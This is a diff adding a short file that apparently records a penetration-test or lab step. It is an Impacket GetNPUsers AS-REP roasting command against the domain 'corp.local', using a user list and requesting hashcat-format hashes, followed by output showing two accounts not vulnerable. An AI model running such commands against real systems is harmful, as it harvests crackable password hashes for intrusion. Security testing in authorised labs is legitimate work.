@@ -1,0 +1,11 @@
+impacket-GetNPUsers corp.local/ \
+  -dc-ip 192.168.100.10 \
+  -usersfile kerbrute_users.txt \
+  -no-pass \
+  -format hashcat \
+  -outputfile asrep_hashes.txt
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User administrator@corp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User intern1@corp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
